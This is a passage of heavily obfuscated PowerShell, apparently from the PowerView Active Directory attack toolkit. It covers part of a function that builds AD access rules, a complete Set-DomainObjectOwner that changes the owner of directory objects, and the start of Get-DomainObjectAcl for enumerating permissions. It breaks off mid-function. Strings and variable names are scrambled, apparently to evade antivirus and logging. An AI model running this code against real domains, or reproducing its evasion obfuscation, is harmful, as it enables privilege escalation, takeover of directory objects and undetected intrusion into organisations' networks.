        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}" -f 'troller','Con','ain','Dom'})]
        [String]
        ${SE`RvEr},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{0}{1}" -f 'O','neLevel'}, {"{1}{0}" -f'e','Subtre'})]
        [String]
        ${SE`ArChsCO`pe} = ("{0}{1}" -f 'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`esUltp`AGeSizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRv`eRtIMe`LI`m`iT},

        [Switch]
        ${T`OMBSTO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`dEntial} =  ( &("{1}{0}" -f 'IR','D') ("VA"+"RiAB"+"lE"+":pkF"+"ezN") )."va`lUE"::"eM`PTy",

        [Parameter(MAndatORy = ${t`RUe})]
        [ValidateSet({"{0}{1}{4}{2}{3}"-f 'Acc','essSyst','ur','ity','emSec'}, {"{0}{3}{2}{1}"-f 'Crea','hild','eC','t'},{"{0}{1}"-f 'Del','ete'},{"{0}{2}{3}{1}" -f 'D','hild','elet','eC'},{"{0}{1}{2}"-f 'D','e','leteTree'},{"{1}{0}{2}{3}"-f 't','Ex','endedRi','ght'},{"{0}{2}{1}" -f 'Gene','ll','ricA'},{"{1}{0}{3}{2}{4}"-f'cExe','Generi','t','cu','e'},{"{2}{0}{3}{1}"-f 'r','ad','Gene','icRe'},{"{2}{1}{0}{3}" -f'neric','e','G','Write'},{"{0}{1}{2}" -f'ListChi','ld','ren'},{"{2}{0}{1}"-f'Ob','ject','List'},{"{2}{1}{0}"-f 'Control','d','Rea'},{"{1}{0}{2}"-f'adProper','Re','ty'},{"{0}{1}" -f 'S','elf'},{"{0}{2}{1}"-f'Synchroni','e','z'},{"{1}{0}" -f'Dacl','Write'},{"{1}{2}{0}" -f'Owner','Writ','e'},{"{0}{2}{1}" -f 'WritePr','perty','o'})]
        ${r`I`GhT},

        [Parameter(maNDatORY = ${t`Rue}, PArAmeteRsETnAme="aCCEs`s`Ru`lETYPE")]
        [ValidateSet({"{1}{0}"-f 'w','Allo'}, {"{1}{0}" -f'y','Den'})]
        [String[]]
        ${Acc`e`Ss`C`ONTRoLtYpe},

        [Parameter(MaNdAtory = ${T`Rue}, PaRAMetERSETNAmE="AuD`Itr`ULE`T`Ype")]
        [ValidateSet({"{1}{0}"-f'cess','Suc'}, {"{0}{1}{2}"-f'Fail','u','re'})]
        [String]
        ${au`d`ITFlAg},

        [Parameter(mAnDaTOry = ${F`ALSE}, PArAMeTERsEtname="AC`CesSRUL`e`TyPe")]
        [Parameter(mANdaTorY = ${fal`SE}, ParAMeTerSETnaME="aU`dIT`RuLeTyPE")]
        [Parameter(mANdatORy = ${FA`lsE}, PARAmETeRSetnaMe="obJe`ctG`U`IdloOkUP")]
        [Guid]
        ${OBJEct`T`Y`pE},

        [ValidateSet('All', {"{1}{2}{0}" -f'n','Child','re'},{"{0}{2}{1}"-f 'Desc','nts','ende'},{"{0}{1}"-f'N','one'},{"{4}{3}{2}{1}{0}" -f 'n','dre','fAndChil','l','Se'})]
        [String]
        ${INH`e`R`I`TANCetYpe},

        [Guid]
        ${i`NHeRIt`Ed`Ob`JECTt`ypE}
    )

    Begin {
        if (${P`R`INCiPALI`dENtity} -notmatch ("{1}{0}" -f '-1-.*','^S')) {
            ${P`RInC`IpAL`SEa`Rc`hER`ArGumEnTs} = @{
                ("{0}{1}"-f'Ident','ity') = ${pr`InCipa`lIDEn`TITy}
                ("{1}{2}{0}" -f 'ies','Pro','pert') = ("{1}{2}{3}{4}{0}"-f'dname,objectsid','dis','ti','ng','uishe')
            }
            if (${psb`oUNdpar`A`Me`TeRs}[("{0}{2}{4}{3}{1}" -f 'P','main','ri','cipalDo','n')]) { ${PRinC`IPal`SEaR`C`HER`ArguMENtS}[("{1}{0}" -f'ain','Dom')] = ${pRINciP`A`lDOMA`in} }
            if (${P`sbo`Undpa`RaME`TE`RS}[("{0}{1}"-f'Serv','er')]) { ${pRInCIpal`s`earCHeRarg`U`mENtS}[("{0}{1}" -f 'Serv','er')] = ${s`ERvER} }
            if (${P`sBounDpAr`AM`eTERs}[("{0}{1}{2}" -f 'SearchS','c','ope')]) { ${PrI`NcIpaLsE`ARCHEra`RG`UME`NTS}[("{0}{2}{1}"-f'S','hScope','earc')] = ${SeA`R`chSC`OpE} }
            if (${PSb`Ou`Nd`PARametERs}[("{1}{2}{3}{0}"-f 'e','Resu','l','tPageSiz')]) { ${PRin`CiPalseaRCHe`R`AR`g`UMenTS}[("{0}{1}{2}"-f 'R','es','ultPageSize')] = ${Re`Sul`TP`AG`eSIze} }
            if (${ps`BOu`NDparam`eTE`Rs}[("{0}{2}{3}{1}"-f'Se','t','rverTime','Limi')]) { ${PrI`NCipA`LSEa`Rch`ERARgu`m`eNTs}[("{4}{1}{0}{3}{2}" -f 'r','ve','it','TimeLim','Ser')] = ${s`ervErT`Ime`LIm`It} }
            if (${psb`O`UnDpaRa`MetE`Rs}[("{0}{2}{1}" -f'Tom','tone','bs')]) { ${PrINcIPals`Ear`chERA`R`gUmeNTs}[("{1}{0}{2}" -f 'st','Tomb','one')] = ${tom`BS`ToNe} }
            if (${Ps`B`OundPaR`AMetE`RS}[("{0}{2}{3}{1}" -f 'C','tial','red','en')]) { ${PriNc`iPAl`Se`ArCH`ER`A`RGumen`Ts}[("{1}{2}{0}"-f'ial','Crede','nt')] = ${cR`Ed`e`NTIAl} }
            ${PRin`c`ip`AL} = &("{2}{3}{1}{4}{0}"-f'ct','ain','Get-D','om','Obje') @PrincipalSearcherArguments
            if (-not ${P`RINcI`Pal}) {
                throw ('Unab'+'le'+' '+'to'+' '+'resolve'+' '+'pr'+'in'+'cipal: '+"$PrincipalIdentity")
            }
            elseif(${P`Ri`NciPAL}."c`ounT" -gt 1) {
                throw ("{3}{4}{19}{14}{5}{18}{10}{11}{8}{6}{9}{13}{7}{1}{15}{2}{0}{12}{16}{17}"-f'but onl','e','s, ','Prin','ci','ma','s ','ipl','e','mu','c','h','y one is','lt','ntity ',' AD object',' a','llowed','t','palIde')
            }
            ${o`B`JecTs`ID} = ${pRiNCI`p`AL}."oB`j`ECTSID"
        }
        else {
            ${ob`je`ctSId} = ${PR`IN`cIPAL`i`DE`NtITy}
        }

        ${ADRi`gHt} = 0
        foreach(${R} in ${R`I`ghT}) {
            ${A`dr`iGhT} = ${adrIG`hT} -bor (([System.DirectoryServices.ActiveDirectoryRights]${r})."VA`lue__")
        }
        ${adr`I`Ght} = [System.DirectoryServices.ActiveDirectoryRights]${ad`RI`gHT}

        ${i`DentI`TY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${obJE`ctS`Id})
    }

    Process {
        if(${P`ScmdL`ET}.pAraMETERsETnamE -eq ("{2}{0}{1}" -f 'u','leType','AuditR')) {

            if(${O`BJEcT`TYPe} -eq ${N`ULL} -and ${inheR`ITaN`cE`TyPE} -eq   ${zT`5x}::"eM`ptY" -and ${iNHe`RI`TEDOBj`e`ct`T`yPE} -eq ${NU`ll}) {
                &("{2}{1}{0}{3}"-f'c','je','New-Ob','t') ("{5}{1}{0}{7}{4}{2}{8}{3}{6}" -f 'ctory','tem.Dire','Au','tRul','eDirectory','Sys','e','Services.Activ','di') -ArgumentList ${iden`TI`Ty}, ${aDr`IgHt}, ${A`U`DI`TflAg}
            } elseif(${obJE`cT`TYpE} -eq ${Nu`lL} -and ${i`Nh`ErIt`A`NCETYpE} -ne  ${z`T5X}::"EmP`TY" -and ${i`NH`eRItEd`oBJeC`Tty`PE} -eq ${NU`lL}) {
                &("{0}{1}{2}"-f 'N','e','w-Object') ("{8}{10}{6}{4}{3}{7}{5}{11}{9}{0}{1}{13}{2}{12}" -f 'veDi','rec','itRul','ire','.D','oryServic','em','ct','Sy','.Acti','st','es','e','toryAud') -ArgumentList ${IDe`NtI`Ty}, ${a`DRi`ghT}, ${aUDI`T`FLag}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${inhe`Ri`Tanc`et`ype})
            } elseif(${ob`Jec`TtYPe} -eq ${NU`ll} -and ${I`NherITance`T`yPE} -ne   ${zT`5X}::"EMp`TY" -and ${iNHer`it`EDoB`jeCTtYPe} -ne ${N`ULl}) {
                &("{2}{1}{0}" -f 'Object','-','New') ("{5}{0}{4}{1}{6}{3}{7}{2}"-f'ystem.Direct','rvices.Active','AuditRule','cto','orySe','S','Dire','ry') -ArgumentList ${iD`eN`T`iTY}, ${ad`R`iGhT}, ${auD`iT`FlAg}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${iNhe`RiTanCE`TypE}), ${In`HErItEd`o`BjECT`TyPe}
            } elseif(${obJe`ct`Ty`Pe} -ne ${N`ULL} -and ${in`hEritA`NCe`TypE} -eq  ${ZT`5x}::"emp`Ty" -and ${iNh`erI`TeD`OB`jEC`TtypE} -eq ${N`ULl}) {
                &("{1}{0}{2}"-f 'w-O','Ne','bject') ("{2}{0}{4}{5}{1}{6}{7}{11}{3}{9}{10}{8}"-f 'y','i','S','irectory','st','em.D','rectoryServices.A','cti','le','A','uditRu','veD') -ArgumentList ${iDENti`TY}, ${a`DrIGHt}, ${Aud`iTf`l`Ag}, ${ob`jeCTT`YPe}
            } elseif(${ObJEc`TT`yPE} -ne ${Nu`Ll} -and ${I`NheRITance`T`Y`pe} -ne  (&("{2}{1}{0}" -f 'bLE','A','VaRi') ("ZT5"+"X"))."v`AlUe"::"eMP`TY" -and ${Inhe`RIT`EdOBjEct`TypE} -eq ${nU`LL}) {
                &("{0}{2}{1}"-f 'N','Object','ew-') ("{3}{9}{4}{1}{10}{2}{8}{7}{5}{0}{6}"-f'tR','c','irec','Syst','Dire','i','ule','ryAud','to','em.','toryServices.ActiveD') -ArgumentList ${I`dEN`TiTY}, ${adR`igHt}, ${au`D`ItFLag}, ${o`BJe`ctt`ype}, ${I`N`heRi`TAnCe`TYpe}
            } elseif(${obJe`CttY`Pe} -ne ${n`ULL} -and ${Inh`eRita`NCet`YPE} -ne  ( &("{1}{0}{2}"-f 'T-VaRIAB','gE','Le') ("{0}{1}" -f 'Zt5','x') -VaLUEo  )::"Em`pty" -and ${I`N`hERiteDOBj`ECTTYpe} -ne ${nU`LL}) {
                &("{1}{2}{0}"-f't','Ne','w-Objec') ("{1}{6}{13}{12}{2}{3}{8}{9}{0}{7}{10}{11}{5}{4}" -f 'orySer','S','m.Dir','e','yAuditRule','irector','y','v','c','t','ices.Act','iveD','e','st') -ArgumentList ${iDeN`T`i`TY}, ${a`D`RighT}, ${AU`dI`Tf`LAG}, ${OB`JEcTt`YPE}, ${I`Nhe`RITaNCetYPe}, ${I`NheriteDoBJec`Tt`YpE}
            }

        }
        else {

            if(${o`Bj`ECTtypE} -eq ${n`ULl} -and ${iNherI`TA`NcEty`Pe} -eq  ${Z`T5x}::"EM`PTY" -and ${IN`HeRiTedO`B`JEctTypE} -eq ${N`ULL}) {
                &("{2}{3}{1}{0}" -f't','c','New-','Obje') ("{10}{3}{6}{5}{7}{2}{12}{11}{0}{1}{9}{4}{8}" -f 'Ac','c','ices.ActiveDire','te','sRul','re','m.Di','ctoryServ','e','es','Sys','tory','c') -ArgumentList ${ID`enTi`Ty}, ${ad`RIGht}, ${Acc`E`Ss`Cont`ROltyPe}
            } elseif(${O`BJ`eCttY`Pe} -eq ${nu`LL} -and ${INhe`RIT`An`CeTYpE} -ne   (  &("{0}{1}" -f'gC','I')  ("{4}{3}{2}{1}{0}" -f 't5x','E:z','bl','RIA','VA'))."vAl`UE"::"eMP`Ty" -and ${iN`hERI`T`eDO`Bj`eCt`TyPe} -eq ${N`ULL}) {
                &("{0}{2}{1}" -f'Ne','ject','w-Ob') ("{0}{3}{6}{2}{4}{5}{9}{1}{8}{10}{7}"-f'System.Directo','e','ices.A','rySer','cti','veDirectoryA','v','Rule','s','cc','s') -ArgumentList ${iD`E`NTiTy}, ${ADr`IGHT}, ${ACCeSSC`on`T`R`oltyPE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${Inh`erI`T`AncEtYpE})
            } elseif(${O`BJec`Tt`YPe} -eq ${nU`Ll} -and ${IN`herI`T`AnCEType} -ne  (  &("{1}{2}{3}{0}"-f'IabLE','GE','t-V','aR') ("{1}{0}"-f 't5X','z')  -valuEONLY  )::"e`MPTy" -and ${I`N`HERite`dOb`jec`TtYPE} -ne ${n`ULL}) {
                &("{0}{2}{1}{3}"-f 'New-Obj','c','e','t') ("{3}{5}{6}{4}{8}{10}{2}{0}{9}{7}{1}{11}{12}"-f'eDirect','Acc','tiv','Syste','rector','m.','Di','y','yServices','or','.Ac','essR','ule') -ArgumentList ${Ide`NT`ItY}, ${A`DRIgHt}, ${AcCeS`scon`T`ROLtYpe}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${i`NH`erIT`AN`CetyPE}), ${iNheRiT`e`d`oBJ`E`cTT`yPe}
            } elseif(${O`BJec`TType} -ne ${NU`Ll} -and ${In`hErIt`AnCEt`ype} -eq  (&("{0}{2}{1}" -f'G','AriaBle','Et-v') ("{1}{0}" -f'5x','ZT') )."v`ALUe"::"Em`PtY" -and ${IN`HE`R`itEDObJEc`TT`YpE} -eq ${n`Ull}) {
                &("{2}{1}{0}" -f't','ec','New-Obj') ("{0}{7}{12}{9}{11}{1}{8}{10}{3}{6}{5}{2}{4}" -f 'S','ct','ssRul','ctiveDirect','e','e','oryAcc','yste','oryS','.','ervices.A','Dire','m') -ArgumentList ${ideN`TI`Ty}, ${A`dR`iGHT}, ${ACCe`SscON`T`RO`LTyPE}, ${OBJ`ECt`TypE}
            } elseif(${oBJ`EcTT`YPE} -ne ${N`ULL} -and ${inHE`RI`TAN`ceTYPe} -ne  (&("{0}{1}{2}"-f'vArIa','bl','E')  ("{1}{0}"-f 'X','Zt5') -VaLUeoNLY  )::"eM`Pty" -and ${iNhEr`iTE`dobjEc`TTYpE} -eq ${n`ULl}) {
                &("{2}{0}{1}"-f 'c','t','New-Obje') ("{10}{4}{6}{9}{2}{5}{8}{0}{1}{7}{11}{3}" -f 'veDi','recto','e','Rule','DirectoryServ','s.Act','i','ryAcce','i','c','System.','ss') -ArgumentList ${Id`Ent`ItY}, ${a`Dri`GHT}, ${AccESS`co`N`TR`oLTyPe}, ${OB`j`E`cTtYpE}, ${INHeRiTa`Nce`TY`Pe}
            } elseif(${O`BJeCTt`yPe} -ne ${n`UlL} -and ${I`NheRi`T`ANCet`yPE} -ne   ${Z`T5X}::"Emp`TY" -and ${InhErI`Te`d`ObJe`cTtY`pE} -ne ${N`Ull}) {
                &("{1}{2}{0}" -f'ject','New-','Ob') ("{8}{0}{6}{5}{3}{4}{1}{7}{2}"-f 'yServ','cessR','le','irecto','ryAc','ces.ActiveD','i','u','System.Director') -ArgumentList ${iDe`NTIty}, ${aD`R`IgHt}, ${ACcE`s`SC`onTrOL`Ty`PE}, ${O`BJeCtt`Y`PE}, ${InHErI`T`An`CETyPe}, ${InhEr`iT`eDOb`jE`CttypE}
            }

        }
    }
}

function s`ET-`doMaInobJecT`owN`eR {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{5}{6}{4}{1}{0}{2}" -f'eChangingFuncti','orStat','ons','P','F','SUseShoul','dProcess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{4}{3}{2}"-f 'SShould','P','ess','oc','Pr'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTiOn = 0, MAndaToRy = ${T`RUe}, VAluefrOMPiPeLiNe = ${T`Rue}, vAlUEfRomPIpeLiNeBYpROPerTYnAmE = ${T`RuE})]
        [Alias({"{1}{0}{3}{4}{2}" -f'u','Disting','dName','is','he'}, {"{3}{2}{4}{1}{0}" -f'me','tNa','m','Sa','Accoun'}, {"{1}{0}"-f 'me','Na'})]
        [String]
        ${iDenT`i`TY},

        [Parameter(ManDATOrY = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Owne','r'})]
        [String]
        ${OwnEr`I`d`entITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OmA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'er','Filt'})]
        [String]
        ${l`Da`PFILter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'A','th','DSPa'})]
        [String]
        ${sE`A`RcH`BASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}" -f'er','DomainCo','ntr','oll'})]
        [String]
        ${se`RvEr},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{1}{0}{2}" -f'Le','One','vel'}, {"{2}{1}{0}" -f'ree','ubt','S'})]
        [String]
        ${Se`Arc`HS`cOPE} = ("{2}{1}{0}"-f 'ree','ubt','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEs`U`lt`P`AGEsIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${servErti`ME`l`Im`iT},

        [Switch]
        ${tomB`S`To`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`edEnTiAl} =   ${p`kf`EZn}::"EMP`Ty"
    )

    BEGIN {
        ${S`EarCh`e`RaRGume`NTs} = @{}
        if (${PsBoUN`d`PA`RA`Met`erS}[("{0}{1}{2}"-f'Do','ma','in')]) { ${s`Ear`C`HeraR`GuMENTS}[("{0}{1}"-f'Domai','n')] = ${DOm`A`in} }
        if (${P`SboUNDParaM`Et`e`Rs}[("{0}{2}{1}"-f 'LDAPF','lter','i')]) { ${seAR`cH`ER`Argu`M`EntS}[("{2}{1}{0}" -f 'lter','APFi','LD')] = ${LD`A`PFIlteR} }
        if (${PsB`OuN`DPaRa`Me`T`ERS}[("{1}{0}{2}" -f'earchBas','S','e')]) { ${S`EArCHeR`AR`g`UmENtS}[("{2}{1}{0}" -f'rchBase','ea','S')] = ${Se`ARCh`B`ASE} }
        if (${PSbOuN`dpa`R`AMET`ers}[("{1}{0}" -f 'rver','Se')]) { ${sEaRCH`ERARGu`m`en`Ts}[("{1}{2}{0}" -f 'r','S','erve')] = ${s`Erver} }
        if (${ps`Bound`pA`RaMETers}[("{1}{0}{2}" -f'chSc','Sear','ope')]) { ${S`eArChE`RAR`Gu`Me`Nts}[("{1}{0}{2}" -f'ear','S','chScope')] = ${sEArchs`cO`PE} }
        if (${P`SBOUn`dpaRA`meT`eRS}[("{1}{3}{0}{2}" -f 'su','R','ltPageSize','e')]) { ${SE`ArcHE`RArg`UmE`NTS}[("{1}{2}{3}{0}"-f 'e','ResultPag','eS','iz')] = ${rEs`UlT`Pag`E`siZE} }
        if (${pSBoUnDPar`Amet`E`RS}[("{0}{1}{2}{3}"-f'S','er','ver','TimeLimit')]) { ${se`ARcHERA`RGUmEN`Ts}[("{2}{0}{3}{1}" -f'ime','mit','ServerT','Li')] = ${sERvERti`m`El`IM`it} }
        if (${p`s`BO`UnDpaRA`m`ETers}[("{3}{2}{1}{0}" -f 'e','ston','mb','To')]) { ${SEArCHE`RaRg`U`mEnts}[("{1}{0}" -f'mbstone','To')] = ${T`oMBs`TOne} }
        if (${P`s`BoUnd`par`AME`TERs}[("{1}{0}{2}" -f 'reden','C','tial')]) { ${Se`A`Rc`heRAR`GuMeNtS}[("{2}{0}{1}" -f 'redentia','l','C')] = ${CREd`E`NtiaL} }

        ${o`wNeRS`ID} = &("{2}{0}{3}{1}" -f'e','-DomainObject','G','t') @SearcherArguments -Identity ${ownE`R`ID`eNt`ITy} -Properties ("{0}{1}{2}" -f'obje','c','tsid') | &("{1}{0}{3}{2}"-f'el','S','t-Object','ec') -ExpandProperty ("{1}{0}" -f'ectsid','obj')
        if (${O`WNE`RsId}) {
            ${O`Wne`RIdENTIT`Yr`E`Fe`REn`cE} = [System.Security.Principal.SecurityIdentifier]${o`wNEr`sId}
        }
        else {
            &("{3}{1}{2}{0}" -f 'ning','e-Wa','r','Writ') ('['+'Se'+'t-'+'Dom'+'ainObject'+'O'+'wner] '+'E'+'rror '+'pa'+'rsing '+'o'+'wner '+'id'+'ent'+'ity'+' '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if (${Own`Er`ideNTITYref`E`ReNCE}) {
            ${SeA`RchER`A`RgUMeNTS}['Raw'] = ${T`RUE}
            ${SEA`RCHEraRGuM`e`Nts}[("{2}{1}{0}" -f 'y','dentit','I')] = ${iD`EnT`ITy}

            ${Ra`WOBj`Ect} = &("{2}{0}{1}{4}{3}"-f'o','ma','Get-D','bject','inO') @SearcherArguments

            ForEach (${ObjE`cT} in ${r`AWob`JEcT}) {
                try {
                    &("{0}{2}{1}"-f 'W','te-Verbose','ri') ('[S'+'et'+'-Do'+'m'+'ai'+'nObj'+'ec'+'tOwner] '+'A'+'ttemp'+'ti'+'ng '+'to'+' '+'s'+'et '+'t'+'he '+'o'+'wner '+'f'+'or '+"'$Identity' "+'t'+'o '+"'$OwnerIdentity'")
                    ${en`TRy} = ${ra`woBj`eCt}.("{1}{0}{3}{2}{4}{5}"-f 'tD','Ge','rectory','i','En','try').Invoke()
                    ${ENt`Ry}."p`SBa`sE"."oPT`Io`Ns"."secURi`T`YmaskS" = ("{1}{0}"-f'wner','O')
                    ${E`NtRY}."psBa`se"."O`B`JeC`TSec`UriTy".("{0}{1}{2}" -f 'Set','Owne','r').Invoke(${O`WneRiDEN`TItY`REfeREnCE})
                    ${ent`Ry}."psb`ASE".("{3}{0}{1}{2}" -f 'mmi','tChan','ges','Co').Invoke()
                }
                catch {
                    &("{2}{0}{1}"-f'W','arning','Write-') ('[Set-Dom'+'ai'+'nObjec'+'t'+'O'+'wner] '+'E'+'rror '+'set'+'ting'+' '+'owne'+'r: '+"$_")
                }
            }
        }
    }
}

function gEt-do`MA`INOb`J`eCt`Acl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{1}{3}{0}{2}"-f'ldProc','SS','ess','hou','P'}, '')]
    [OutputType({"{0}{2}{1}"-f'Pow','iew.ACL','erV'})]
    [CmdletBinding()]
    Param (
        [Parameter(POSItIoN = 0, ValuEfROmpiPEliNe = ${T`RUe}, vAlUefROmpiPeLiNebYProPeRTYNaME = ${t`RUE})]
        [Alias({"{2}{1}{3}{0}"-f'shedName','istingu','D','i'}, {"{0}{2}{1}{3}" -f'S','AccountN','am','ame'}, {"{0}{1}"-f'N','ame'})]
        [String[]]
        ${I`dE`NTiTY},

        [Switch]
        ${sa`Cl},

        [Switch]
        ${ReS`Ol`Veg`UIDs},

        [String]
        [Alias({"{0}{1}" -f 'R','ights'})]
        [ValidateSet('All', {"{2}{1}{3}{0}" -f 'ord','etP','Res','assw'}, {"{2}{1}{0}"-f'Members','rite','W'})]
        ${RI`G`h`TsFIltEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'er','Filt'})]
        [String]
        ${LD`A`Pf`ILTeR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADSPat','h'})]
        [String]
        ${SeA`R`Ch`BaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'Do','mainCont','roller'})]
        [String]
        ${Ser`VEr},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{1}{0}"-f 'vel','OneLe'}, {"{1}{2}{0}" -f'ee','Subt','r'})]
        [String]
        ${s`Ea`RcHScO`PE} = ("{0}{1}{2}" -f'Subt','re','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSUl`T`pAGEsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeR`Ve`Rt`ImeLiMIT},

        [Switch]
        ${T`OmBsTO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`dENtI`AL} =   (  &('gI')  ("{0}{4}{3}{1}{2}"-f 'vaR','Pk','FEZN','lE:','iAb')  )."Val`Ue"::"eM`PTy"
    )

    BEGIN {
        ${S`E`A`RChERARg`Ume`NtS} = @{
            ("{0}{2}{1}" -f 'Propert','s','ie') = ("{8}{10}{6}{16}{3}{15}{4}{11}{2}{5}{13}{14}{9}{1}{12}{0}{7}"-f 'ects','ame,ob','iptor','me','esc',',di','u','id','samac','n','co','r','j','stingui','shed',',ntsecurityd','ntna')
        }

        if (${P`SBO`UNdP`AramE`Te`RS}[("{1}{0}"-f 'l','Sac')]) {
            ${sEArc`HERAR`G`Um`EnTS}[("{2}{1}{0}{3}{4}" -f 'it','ecur','S','yMas','ks')] = ("{0}{1}" -f 'S','acl')
        }
        else {
            ${sEar`CherARG`U`m`E`NTs}[("{0}{1}{2}" -f'Se','curityMask','s')] = ("{1}{0}"-f'l','Dac')
        }
        if (${psb`o`UnDPAr`AmEteRs}[("{1}{0}"-f'in','Doma')]) { ${SeaRcherARG`U`mEN`Ts}[("{0}{1}"-f'D','omain')] = ${D`oM`AIN} }
        if (${PS`B`OunDPara`Me`TERs}[("{0}{1}{2}" -f'SearchB','a','se')]) { ${S`EA`RCH`E`RA`RguMenTS}[("{1}{2}{0}"-f'e','Se','archBas')] = ${sE`ARC`hB`AsE} }
        if (${P`s`BounD`PAraMetERs}[("{1}{0}"-f'ver','Ser')]) { ${SEaRCHER`Argu`men`Ts}[("{1}{0}"-f'er','Serv')] = ${ser`VEr} }
        if (${PSBO`U`Nd`pARAME`T`erS}[("{2}{0}{1}{3}" -f 'c','hSco','Sear','pe')]) { ${SE`ARChE`RarGUm`EntS}[("{1}{0}{2}"-f 'rchSc','Sea','ope')] = ${SeA`RChSco`Pe} }
        if (${Psboun`dpAr`A`me`TeRs}[("{2}{1}{0}"-f'ze','i','ResultPageS')]) { ${SEarC`hERaR`Gu`mEN`Ts}[("{0}{3}{1}{4}{2}" -f 'Resul','PageS','e','t','iz')] = ${rESUltPa`ges`I`Ze} }
        if (${PsbouN`d`p`Aram`ETeRs}[("{0}{1}{2}" -f'Se','rverTime','Limit')]) { ${SEARC`HeRa`R`GU`M`EntS}[("{3}{1}{2}{0}" -f'it','erve','rTimeLim','S')] = ${SeRVeRtIME`lI`mIT} }
        if (${p`SBoU`NdP`Aram`ETERs}[("{2}{0}{1}"-f'o','mbstone','T')]) { ${sE`Ar`ChER`ARGU`mE`NtS}[("{1}{2}{0}" -f'ne','Tombst','o')] = ${t`oM`Bs`Tone} }
        if (${pSB`oUNDp`ArA`mE`TErs}[("{2}{0}{3}{1}" -f'r','tial','C','eden')]) { ${s`Ear`C`HE`R`ARgumeNTs}[("{1}{2}{3}{0}" -f'al','Cred','ent','i')] = ${C`R`edenTIal} }
        ${s`eARc`HEr} = &("{0}{3}{1}{2}"-f'Get-Dom','ear','cher','ainS') @SearcherArguments

        ${D`OmAIN`G`Ui`D`mAParG`Umen`TS} = @{}
        if (${psB`OuNdPaRA`M`e`Ters}[("{2}{0}{1}"-f'om','ain','D')]) { ${doM`Aing`U`i`dmApaRGUMEnTS}[("{0}{1}"-f'D','omain')] = ${DOMa`In} }
        if (${P`sbou`NdP`A`RAM`eTErs}[("{1}{0}"-f'er','Serv')]) { ${Do`ma`inG`UIDMAPArguMEn`Ts}[("{0}{1}"-f'Serv','er')] = ${sErV`ER} }
        if (${pS`BouNDParAME`T`ERs}[("{2}{1}{0}"-f'ultPageSize','es','R')]) { ${domAiNGUI`D`MaP`Ar`gu`m`EN`TS}[("{0}{3}{1}{2}" -f 'Re','tPage','Size','sul')] = ${Re`SU`lTPaGESi`Ze} }
        if (${ps`BoUnD`Pa`Ra`MEters}[("{0}{1}{2}"-f'Server','Ti','meLimit')]) { ${D`oMa`inGUi`dmaparg`UmentS}[("{1}{0}{2}{3}"-f 'erver','S','TimeLim','it')] = ${SerV`E`RtIm`Eli`mIt} }
        if (${PSboun`d`PA`RAmet`ErS}[("{1}{2}{0}"-f'l','Cred','entia')]) { ${dOm`AIngUiD`mAP`AR`GuMe`Nts}[("{3}{1}{2}{0}" -f'ial','r','edent','C')] = ${Creden`TI`Al} }

        if (${PsB`O`UnDpA`Ram`e`TERs}[("{2}{0}{1}" -f'ID','s','ResolveGU')]) {
            ${G`U`IDS} = &("{0}{2}{3}{1}" -f 'Get-Dom','DMap','ainG','UI') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${s`EARc`her}) {
            ${ideNTIT`YFI`lteR} = ''
            ${FI`Lter} = ''
            ${i`DEnt`iTy} | &("{1}{3}{2}{0}"-f't','Wh','bjec','ere-O') {${_}} | &("{0}{2}{1}"-f'F','ch-Object','orEa') {
                ${I`DenTit`yIN`s`TaNce} = ${_}.("{0}{1}"-f'Rep','lace').Invoke('(', '\28').("{2}{0}{1}"-f'a','ce','Repl').Invoke(')', '\29')
                if (${iDE`N`TITyiN`StancE} -match ("{1}{0}{2}" -f'S-1','^','-.*')) {
                    ${i`DENT`ityFIlt`er} += "(objectsid=$IdentityInstance)"
                }
                elseif (${idEntiT`YI`NSTa`Nce} -match ((("{1}{2}{4}{0}{3}"-f 'rD','^','(C','C)=.*','NfBrOUfB')) -RePLacE 'fBr',[Char]124)) {
                    ${idE`NT`i`T`YFiLteR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pS`BOu`NdPaRamEtE`RS}[("{0}{1}" -f 'D','omain')]) -and (-not ${P`s`BOunD`PAR`AmeT`ERS}[("{1}{2}{0}"-f 'ase','Search','B')])) {

